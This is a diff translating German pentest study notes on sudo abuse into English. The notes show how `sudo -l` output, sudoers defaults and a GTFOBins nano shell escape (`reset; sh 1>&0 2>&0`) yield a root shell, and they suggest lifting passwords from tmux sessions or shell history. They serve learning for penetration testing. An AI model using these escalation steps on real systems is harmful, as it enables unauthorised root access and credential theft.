@@ -4,9 +4,9 @@ aliases: [sudo -l, GTFOBins]
 ---
 # Sudo Abuse
 
-> `sudo -l` zeigt, welche Befehle ein User als root (oder anderer User) ausführen darf. Erlaubte Binaries, die eine **Shell-Escape** können, führen direkt zu root → [GTFOBins](https://gtfobins.github.io/).
+> `sudo -l` shows which commands a user may run as root (or another user). Allowed binaries capable of a **shell escape** lead straight to root → [GTFOBins](https://gtfobins.github.io/).
 
-## Rechte prüfen
+## Check privileges
 ```bash
 sudo -l
 ```
@@ -19,30 +19,30 @@ User sadm may run the following commands:
     (ALL) PASSWD: /usr/bin/tail /var/log/syslog
 ```
 
-## Wichtige Defaults
-| Eintrag                | Bedeutung                                                                  |
+## Important defaults
+| Entry                  | Meaning                                                                    |
 | ---------------------- | -------------------------------------------------------------------------- |
-| `NOPASSWD`             | Befehl ohne Passwort ausführbar                                            |
-| `PASSWD`               | Passwort nötig (→ evtl. aus tmux-Session / Historie holen)                 |
-| `timestamp_timeout=-1` | einmal `sudo` authentifiziert → **bleibt gültig** (kein erneutes PW nötig) |
+| `NOPASSWD`             | command runs without a password                                            |
+| `PASSWD`               | password required (→ maybe grab it from a tmux session / history)          |
+| `timestamp_timeout=-1` | authenticate `sudo` once → **stays valid** (no password needed again)      |
 
-## GTFOBins: nano als Root-Shell
-Ist `nano` per `sudo` erlaubt, aus dem Editor heraus einen Befehl als root starten:
+## GTFOBins: nano as a root shell
+If `nano` is allowed via `sudo`, start a command as root from within the editor:
 ```SHELL
 sudo nano /etc/firewall.sh
 
-Strg+R        (Read File)
-Strg+X        (wechselt zu "Execute Command")
+Ctrl+R        (Read File)
+Ctrl+X        (switches to "Execute Command")
 reset; sh 1>&0 2>&0
 ```
 
-| Teil         | Bedeutung                                                      |
+| Part         | Meaning                                                        |
 | ------------ | -------------------------------------------------------------- |
-| `reset`      | Terminal in Normalzustand zurücksetzen                         |
-| `sh`         | Shell starten (nano läuft als root → Shell ist root)           |
-| `1>&0 2>&0`  | stdout(1) + stderr(2) auf stdin(0) = Terminal umleiten          |
+| `reset`      | reset the terminal to its normal state                         |
+| `sh`         | start a shell (nano runs as root → the shell is root)          |
+| `1>&0 2>&0`  | redirect stdout(1) + stderr(2) to stdin(0) = the terminal      |
 
-=> Root-Shell. Was `1>&0 2>&0` genau bewirkt → [[File Descriptors]].
+=> Root shell. What `1>&0 2>&0` does exactly → [[File Descriptors]].
 
-> [!tip] Weitere Binaries
-> Jedes per `sudo` erlaubte Programm gegen [GTFOBins](https://gtfobins.github.io/) prüfen (`vi`, `less`, `tail`, `find`, `awk`, …) – viele haben einen Shell-Escape.
+> [!tip] Other binaries
+> Check every program allowed via `sudo` against [GTFOBins](https://gtfobins.github.io/) (`vi`, `less`, `tail`, `find`, `awk`, …) – many have a shell escape.
